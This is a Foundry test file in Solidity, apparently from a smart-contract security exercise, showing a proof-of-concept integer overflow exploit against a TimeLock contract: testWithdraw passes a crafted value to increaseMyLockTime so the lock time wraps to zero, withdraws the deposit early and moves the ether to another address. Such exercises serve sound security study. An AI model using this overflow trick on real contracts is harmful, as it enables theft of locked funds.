// SPDX-License-Identifier: MIT
pragma abicoder v2;
pragma solidity ^0.7.0;

import {Test, console} from "forge-std/Test.sol";
import {TimeLock} from "../../src/ao-1/TimeLock.sol";

contract TimeLockTest is Test {

    address deployer = makeAddr("deployer");
    address victim = makeAddr("victim");
    address goodBoy = makeAddr("goodBoy");

    TimeLock timelock;

    uint256 constant VICTIM_INITIAL_BALANCE = 100 ether;
    uint256 constant VICTIM_DEPOSIT = 10 ether;
    uint256 constant public MAX_INT_TYPE = type(uint256).max;

    function setUp() public {
        vm.prank(deployer);
        timelock = new TimeLock();

        // victim deposits funds
        hoax(victim, VICTIM_INITIAL_BALANCE);
        timelock.depositETH{value: VICTIM_DEPOSIT}();
        
    }

    function testDeposit() public {
        assertEq(timelock.getBalance(victim), VICTIM_DEPOSIT);
    }

    function testWithdraw() public {
        vm.startPrank(victim);
        uint256 currentLocktime = timelock.getLocktime(victim);
        uint256 overflowNumber = (MAX_INT_TYPE - currentLocktime) + 1;
        timelock.increaseMyLockTime(overflowNumber);

        timelock.withdrawETH();
        assertEq(victim.balance, VICTIM_INITIAL_BALANCE);

        (bool success, ) = goodBoy.call{value: VICTIM_INITIAL_BALANCE}("");
        assertEq(success, true);
        assertEq(victim.balance, 0 ether);
        assertEq(goodBoy.balance, VICTIM_INITIAL_BALANCE);
        vm.stopPrank();
    }

}